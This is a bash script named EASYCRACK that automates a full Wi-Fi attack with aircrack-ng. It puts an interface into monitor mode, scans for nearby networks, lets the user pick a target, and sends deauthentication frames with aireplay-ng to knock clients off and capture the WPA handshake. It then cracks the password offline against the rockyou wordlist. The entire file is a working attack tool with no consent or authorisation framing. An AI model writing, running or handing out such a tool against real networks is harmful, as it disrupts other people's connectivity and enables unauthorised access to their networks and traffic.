#!/usr/bin/env bash

set -e

GREEN='\033[1;32m'; YELLOW='\033[1;33m'; RED='\033[1;31m'; CYAN='\033[1;36m'; RESET='\033[0m'

banner() { echo -e "${CYAN}
  ╔══════════════════════════════╗
  ║     ✦ EASYCRACK v1.0 ✦      ║
  ║  Automated aircrack-ng       ║
  ║  Scan · Capture · Crack      ║
  ╚══════════════════════════════╝${RESET}"; }

check_deps() {
  local deps=(aircrack-ng airodump-ng aireplay-ng)
  local missing=()
  for d in "${deps[@]}"; do
    if ! command -v "$d" &>/dev/null; then
      missing+=("$d")
    fi
  done
  if [ ${#missing[@]} -gt 0 ]; then
    echo -e "${RED}✖ Missing: ${missing[*]}${RESET}"
    echo -e "${YELLOW}  Linux: sudo apt install aircrack-ng${RESET}"
    echo -e "${YELLOW}  Termux: pkg install aircrack-ng root-repo && pkg install aircrack-ng${RESET}"
    exit 1
  fi
}

list_interfaces() {
  echo -e "${YELLOW}[*] Detecting wireless interfaces...${RESET}"
  local ifaces=()
  if command -v iwconfig &>/dev/null; then
    mapfile -t ifaces < <(iwconfig 2>/dev/null | grep -oP '^\S+' || true)
  fi
  if [ ${#ifaces[@]} -eq 0 ]; then
    mapfile -t ifaces < <(ip link show 2>/dev/null | grep -oP '^\d+: \K\w+' | grep -E '^wlan|^wl' || true)
  fi
  if [ ${#ifaces[@]} -eq 0 ]; then
    echo -e "${RED}✖ No wireless interface found${RESET}"; exit 1
  fi
  echo -e "${GREEN}Available interfaces:${RESET}"
  for i in "${!ifaces[@]}"; do echo "  $((i+1)). ${ifaces[$i]}"; done
  read -p "$(echo -e "${CYAN}Select number [1]: ${RESET}")" n; n=${n:-1}
  IFACE="${ifaces[$((n-1))]}"
  echo -e "${GREEN}✓ Using: $IFACE${RESET}"
}

enable_monitor() {
  echo -e "${YELLOW}[*] Enabling monitor mode on $IFACE...${RESET}"
  sudo ip link set "$IFACE" down 2>/dev/null || true
  sudo iw dev "$IFACE" set type monitor 2>/dev/null || sudo airmon-ng start "$IFACE" &>/dev/null || true
  sudo ip link set "$IFACE" up 2>/dev/null || true
  echo -e "${GREEN}✓ Monitor mode enabled${RESET}"
}

disable_monitor() {
  echo -e "${YELLOW}[*] Disabling monitor mode...${RESET}"
  sudo ip link set "$IFACE" down 2>/dev/null || true
  sudo iw dev "$IFACE" set type managed 2>/dev/null || sudo airmon-ng stop "$IFACE" &>/dev/null || true
  sudo ip link set "$IFACE" up 2>/dev/null || true
  echo -e "${GREEN}✓ Monitor mode disabled${RESET}"
}

scan_networks() {
  local bssid_file="$1"
  echo -e "${YELLOW}[*] Scanning networks (10s)... Press Ctrl+C to skip early${RESET}"
  sudo timeout 12 airodump-ng --write "$bssid_file" --output-format csv "$IFACE" &>/dev/null || true
  if [ ! -f "${bssid_file}-01.csv" ]; then
    echo -e "${RED}✖ No networks found${RESET}"; exit 1
  fi
  echo -e "\n${GREEN}Networks found:${RESET}"
  mapfile -t lines < <(awk -F',' 'NR>2 && $1~/^[[:space:]]*[A-F0-9]{2}:/ {
    bssid=$1; ch=$4; essid=$14
    gsub(/^[[:space:]]+|[[:space:]]+$/, "", bssid)
    gsub(/^[[:space:]]+|[[:space:]]+$/, "", essid)
    gsub(/^[[:space:]]+|[[:space:]]+$/, "", ch)
    if (essid == "" || essid == " ") essid = "(hidden)"
    printf "%s|%s|%s\n", bssid, ch, essid
  }' "${bssid_file}-01.csv")
  for i in "${!lines[@]}"; do
    IFS='|' read -r b ch essid <<< "${lines[$i]}"
    printf "  %2d) %-20s CH:%-3s %s\n" $((i+1)) "$b" "$ch" "$essid"
  done
  read -p "$(echo -e "${CYAN}Select network number: ${RESET}")" n
  IFS='|' read -r BSSID CH TARGET <<< "${lines[$((n-1))]}"
  echo -e "${GREEN}✓ Selected: $BSSID ($TARGET)${RESET}"
}

capture_handshake() {
  echo -e "${YELLOW}[*] Capturing handshake for $BSSID on channel $CH${RESET}"
  echo -e "${YELLOW}[*] Deauthenticating clients to force reconnection...${RESET}"

  sudo airodump-ng --bssid "$BSSID" --channel "$CH" --write "capture_$TARGET" "$IFACE" &>/dev/null &
  local dump_pid=$!

  sleep 2
  sudo aireplay-ng --deauth 5 -a "$BSSID" "$IFACE" &>/dev/null || true

  echo -e "${YELLOW}Waiting up to 30s for handshake...${RESET}"
  local waited=0
  while [ $waited -lt 30 ]; do
    if grep -q "WPA handshake" "capture_${TARGET}-01.csv" 2>/dev/null; then
      echo -e "${GREEN}✓ Handshake captured!${RESET}"
      kill $dump_pid 2>/dev/null || true
      return 0
    fi
    sleep 2; waited=$((waited+2))
  done

  kill $dump_pid 2>/dev/null || true
  if ls "capture_${TARGET}-01.cap" 2>/dev/null; then
    echo -e "${YELLOW}⚠ Might have captured. File: capture_${TARGET}-01.cap${RESET}"
  else
    echo -e "${RED}✖ No handshake captured. Try again with a connected client.${RESET}"
    exit 1
  fi
}

crack() {
  local capfile="${1:-capture_${TARGET}-01.cap}"
  if [ ! -f "$capfile" ]; then
    echo -e "${RED}✖ File not found: $capfile${RESET}"; exit 1
  fi
  echo -e "${YELLOW}[*] Cracking with aircrack-ng...${RESET}"
  read -p "$(echo -e "${CYAN}Wordlist path [rockyou.txt]: ${RESET}")" WORDLIST
  WORDLIST="${WORDLIST:-/usr/share/wordlists/rockyou.txt}"
  if [ ! -f "$WORDLIST" ]; then
    echo -e "${RED}✖ Wordlist not found at $WORDLIST${RESET}"
    echo -e "${YELLOW}  Download: sudo wget -O /usr/share/wordlists/rockyou.txt.gz https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt${RESET}"
    exit 1
  fi
  sudo aircrack-ng -w "$WORDLIST" "$capfile"
}

cleanup() {
  echo -e "\n${YELLOW}[*] Cleaning up temp files...${RESET}"
  rm -f capture_*.csv capture_*.cap capture_*.netxml bssid_* 2>/dev/null || true
  echo -e "${GREEN}✓ Done${RESET}"
}

usage() {
  echo -e "${CYAN}Usage:${RESET} sudo ./easycrack.sh [option]"
  echo -e "  ${GREEN}No args${RESET}  → Interactive menu (full workflow)"
  echo -e "  ${GREEN}--crack <file>${RESET}  → Crack an existing .cap file"
  echo -e "  ${GREEN}--help${RESET}  → Show this help"
  exit 0
}

main() {
  case "${1:-}" in
    --help|-h)
      usage
      ;;
    --crack)
      if [ -z "$2" ]; then echo -e "${RED}Specify a .cap file${RESET}"; exit 1; fi
      banner
      check_deps
      crack "$2"
      exit 0
      ;;
    *)
      banner
      check_deps
      echo -e "${CYAN}Select mode:${RESET}"
      echo "  1) Full auto: scan → capture → crack"
      echo "  2) Capture handshake only"
      echo "  3) Crack an existing .cap file"
      read -p "$(echo -e "${CYAN}Choice [1]: ${RESET}")" mode; mode=${mode:-1}
      case $mode in
        1)
          list_interfaces
          enable_monitor
          local bssid_file="bssid_$$"
          scan_networks "$bssid_file"
          capture_handshake
          disable_monitor
          crack
          cleanup
          ;;
        2)
          list_interfaces
          enable_monitor
          local bssid_file="bssid_$$"
          scan_networks "$bssid_file"
          capture_handshake
          disable_monitor
          echo -e "${GREEN}✓ Saved to capture_${TARGET}-01.cap${RESET}"
          ;;
        3)
          read -p "$(echo -e "${CYAN}Path to .cap file: ${RESET}")" capfile
          crack "$capfile"
          ;;
      esac
      ;;
  esac
}

main "$@"
